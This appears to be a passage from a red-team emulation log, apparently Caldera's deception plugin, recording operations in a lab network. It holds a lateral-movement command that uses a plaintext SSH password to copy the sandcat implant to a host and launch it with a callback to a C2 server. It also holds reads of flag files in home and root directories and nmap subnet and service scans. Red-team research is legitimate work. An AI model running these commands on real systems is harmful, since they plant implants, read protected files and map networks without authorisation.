"2023-10-09T20:53:47Z"}, {"deadman": false, "finish": "2023-10-09T20:53:57Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "7acea455-6c62-442a-8feb-8cd9ebc577a3", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux ceo@192.168.200.4:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 ceo@192.168.200.4 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-09T20:53:50Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "ceo", "unique": "host.lateralMove.userceo", "created": "2023-10-09T20:53:50Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.4", "unique": "host.lateralMove.ip192.168.200.4", "created": "2023-10-09T20:53:50Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "8000", "unique": "host.lateralMove.port8000", "created": "2023-10-09T20:53:50Z", "relationships": []}], "unique": "7acea455-6c62-442a-8feb-8cd9ebc577a3", "decide": "2023-10-09T20:53:50Z", "status": 1, "score": 15, "pid": "1888", "relationships": [], "host": "intern-host", "pin": 0, "paw": "suzear", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-09T20:53:57Z", "command": "sshpass -p \"ubuntu\" scp -P 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux ceo@192.168.200.4:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 ceo@192.168.200.4 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["7acea455-6c62-442a-8feb-8cd9ebc577a3"], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.4", "unique": "host.ip.address192.168.200.4", "created": "2023-10-09T20:53:57Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:53:57Z"}, {"deadman": false, "finish": null, "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "4672125c-4875-4d24-8d4a-9eb634ff3d96", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux ceo@192.168.200.4:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 ceo@192.168.200.4 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-09T20:54:00Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "ceo", "unique": "host.lateralMove.userceo", "created": "2023-10-09T20:54:00Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.4", "unique": "host.lateralMove.ip192.168.200.4", "created": "2023-10-09T20:54:00Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["suzear"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "22", "unique": "host.lateralMove.port22", "created": "2023-10-09T20:54:00Z", "relationships": []}], "unique": "4672125c-4875-4d24-8d4a-9eb634ff3d96", "decide": "2023-10-09T20:54:00Z", "status": -3, "score": 15, "pid": null, "relationships": [], "host": "intern-host", "pin": 0, "paw": "suzear", "output": "False", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux ceo@192.168.200.4:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 ceo@192.168.200.4 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": null}, {"deadman": false, "finish": "2023-10-09T20:54:51Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "ae131a42-2f70-4f02-a3dc-92c506040bca", "plaintext_command": "ls -l /home", "used": [{"trait": "host.dir.path", "links": [], "collected_by": ["suzear", "jkkxja"], "score": 3, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-09T20:54:50Z", "relationships": []}], "unique": "ae131a42-2f70-4f02-a3dc-92c506040bca", "decide": "2023-10-09T20:54:50Z", "status": 0, "score": 1, "pid": "980", "relationships": [{"target": {"trait": "host.dir.children", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["activedir"], "unique": "host.dir.children['activedir']", "created": "2023-10-09T20:54:51Z", "relationships": []}, "source": {"trait": "host.dir.path", "links": [], "collected_by": ["suzear", "jkkxja"], "score": 3, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-09T20:54:50Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a9ab430>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe71a6a7760>", "score": 1}], "host": "activedir-host", "pin": 0, "paw": "jkkxja", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-ls", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.dir.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.children"}]}], "buckets": ["utility"], "technique_name": "Deception Enum Folders"}, "agent_reported_time": "2023-10-09T20:54:51Z", "command": "ls -l /home", "facts": [{"trait": "host.dir.path", "links": ["0c679781-3779-4477-ac21-ba56526b73f0", "ae131a42-2f70-4f02-a3dc-92c506040bca"], "collected_by": ["suzear", "jkkxja"], "score": 3, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-09T20:52:04Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])", "host.dir.path(/home) : has_contents : host.dir.children(['activedir'])"]}, {"trait": "host.dir.children", "links": ["ae131a42-2f70-4f02-a3dc-92c506040bca"], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": "T9012", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["activedir"], "unique": "host.dir.children['activedir']", "created": "2023-10-09T20:54:51Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['activedir'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:54:51Z"}, {"deadman": false, "finish": "2023-10-09T20:54:58Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "40858ebe-8beb-4d46-9d9e-3c5e4e0a6622", "plaintext_command": "cat /home/activedir/flag.txt", "used": [{"trait": "host.file.path", "links": [], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "/home/activedir/flag.txt", "unique": "host.file.path/home/activedir/flag.txt", "created": "2023-10-09T20:54:55Z", "relationships": []}], "unique": "40858ebe-8beb-4d46-9d9e-3c5e4e0a6622", "decide": "2023-10-09T20:54:55Z", "status": 1, "score": 1, "pid": "997", "relationships": [], "host": "activedir-host", "pin": 0, "paw": "jkkxja", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-09T20:54:58Z", "command": "cat /home/activedir/flag.txt", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:54:58Z"}, {"deadman": false, "finish": "2023-10-09T20:55:04Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "ca708498-9aa6-4ea0-b477-da1aee5dd824", "plaintext_command": "cat /root/flag.txt", "used": [{"trait": "host.file.path", "links": [], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "/root/flag.txt", "unique": "host.file.path/root/flag.txt", "created": "2023-10-09T20:55:00Z", "relationships": []}], "unique": "ca708498-9aa6-4ea0-b477-da1aee5dd824", "decide": "2023-10-09T20:55:00Z", "status": 1, "score": 1, "pid": "1387", "relationships": [], "host": "activedir-host", "pin": 0, "paw": "jkkxja", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-09T20:55:04Z", "command": "cat /root/flag.txt", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:55:04Z"}, {"deadman": false, "finish": "2023-10-09T20:55:13Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "3df2c787-4ce8-4826-a463-0515fa5a0034", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.0/24", "unique": "scan.subnet.addr192.168.200.0/24", "created": "2023-10-09T20:55:05Z", "relationships": []}], "unique": "3df2c787-4ce8-4826-a463-0515fa5a0034", "decide": "2023-10-09T20:55:05Z", "status": 0, "score": 1, "pid": "1542", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["192.168.200.1", "192.168.200.2", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.7", "192.168.200.3"], "unique": "host.subnet.online_ipaddrs['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.3']", "created": "2023-10-09T20:55:13Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-09T20:55:13Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a6a4dc0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe71a6a6950>", "score": 1}], "host": "activedir-host", "pin": 0, "paw": "jkkxja", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T20:55:11Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["aae79d82-0909-4166-be4a-dd21cd4ec3cb", "3df2c787-4ce8-4826-a463-0515fa5a0034"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-09T20:52:29Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.3'])"]}, {"trait": "host.subnet.online_ipaddrs", "links": ["3df2c787-4ce8-4826-a463-0515fa5a0034"], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["192.168.200.1", "192.168.200.2", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.7", "192.168.200.3"], "unique": "host.subnet.online_ipaddrs['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.3']", "created": "2023-10-09T20:55:13Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.3'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:55:11Z"}, {"deadman": false, "finish": "2023-10-09T20:55:34Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "0de0002c-bc57-4bee-9c3e-f051fadef6ce", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.201.0/24", "unique": "scan.subnet.addr192.168.201.0/24", "created": "2023-10-09T20:55:15Z", "relationships": []}], "unique": "0de0002c-bc57-4bee-9c3e-f051fadef6ce", "decide": "2023-10-09T20:55:15Z", "status": 0, "score": 1, "pid": "1545", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["192.168.201.3"], "unique": "host.subnet.online_ipaddrs['192.168.201.3']", "created": "2023-10-09T20:55:34Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-09T20:55:34Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a636230>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe71a636350>", "score": 1}], "host": "activedir-host", "pin": 0, "paw": "jkkxja", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T20:55:21Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["1cb1c2e9-4f25-4292-ad17-9ae70d4971f5", "0de0002c-bc57-4bee-9c3e-f051fadef6ce"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-09T20:53:01Z", "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3'])"]}, {"trait": "host.subnet.online_ipaddrs", "links": ["0de0002c-bc57-4bee-9c3e-f051fadef6ce"], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["192.168.201.3"], "unique": "host.subnet.online_ipaddrs['192.168.201.3']", "created": "2023-10-09T20:55:34Z", "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:55:21Z"}, {"deadman": false, "finish": "2023-10-09T20:56:06Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "7a7e66b4-cb00-4976-b0d1-530e8159de17", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.1,2,4,5,6,7,3", "used": [{"trait": "scan.remote.addr", "links": [], "collected_by": [], "score": 11, "limit_count": -1, "name": "scan.remote.addr", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.1,2,4,5,6,7,3", "unique": "scan.remote.addr192.168.200.1,2,4,5,6,7,3", "created": "2023-10-09T20:55:36Z", "relationships": []}], "unique": "7a7e66b4-cb00-4976-b0d1-530e8159de17", "decide": "2023-10-09T20:55:36Z", "status": 0, "score": 1, "pid": "1565", "relationships": [{"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-09T20:56:06Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, 